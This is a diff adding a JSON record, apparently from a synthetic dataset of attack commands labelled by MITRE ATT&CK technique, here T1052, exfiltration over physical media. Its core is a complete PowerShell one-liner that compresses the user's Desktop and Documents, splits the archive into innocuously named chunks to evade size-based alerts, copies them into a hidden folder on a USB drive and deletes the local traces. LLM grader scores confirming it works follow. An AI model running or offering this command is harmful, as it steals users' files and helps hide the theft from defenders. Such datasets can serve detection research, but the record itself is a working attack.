@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=\"$env:TEMP\\stage.zip\"; Compress-Archive -Path \"$env:USERPROFILE\\Desktop\\*\", \"$env:USERPROFILE\\Documents\\*\" -DestinationPath $zip -Force; $chunkDir=Join-Path $env:TEMP 'chunks'; New-Item -ItemType Directory -Force -Path $chunkDir | Out-Null; $b=[IO.File]::ReadAllBytes($zip); $size=4194304; for($i=0;$i -lt $b.Length;$i+=$size){ $end=[Math]::Min($i+$size,$b.Length); [IO.File]::WriteAllBytes((Join-Path $chunkDir (\"cache_{0:D3}.bin\" -f [int]($i/$size))), $b[$i..($end-1)]) }; $dst=Join-Path $usb '.cache'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Copy-Item (Join-Path $chunkDir 'cache_*.bin') $dst -Force; Remove-Item $zip -Force; Remove-Item $chunkDir -Recurse -Force",
+  "explanation": "Archives targeted user data, splits into small chunks, and writes the pieces to a hidden folder on the USB using Copy-Item to blend with normal file sizes and reduce detection.",
+  "rationale_steps": [
+    "Find removable drive",
+    "Compress data for efficiency",
+    "Split archive into smaller chunks to evade size-based alerts",
+    "Create hidden destination on the USB",
+    "Copy chunks to USB using Copy-Item and remove staging files"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-7419b2ba",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, and proper separators; no apparent parsing issues.",
+        "semantic_score": 5,
+        "semantic_justification": "It archives Desktop/Documents, splits the archive into 4MB chunks, writes them to a hidden folder on a removable USB drive, and removes local artifacts, aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:33:00.057976Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced quotes, valid cmdlets, and proper separators, though the array slicing `$b[$i..($end-1)]` may have edge-case issues with large byte arrays in some PowerShell versions, and the string concatenation for `$usb` is slightly unconventional but parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable drive, compressing targeted user data (Desktop and Documents), splitting the archive into 4MB chunks with innocuous-looking names (cache_NNN.bin), copying them to a hidden folder on the USB, and cleaning up staging artifacts — fully consistent with the described exfiltration-over-physical-medium technique including staging, chunking, obfuscation, and anti-detection measures.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-18T22:42:21.412693Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variables, loops, .NET static methods, and path joining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the T1052 technique by identifying a removable drive, archiving data, chunking the archive to evade file-size detections, and hiding the destination directory.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:42:24.943014Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
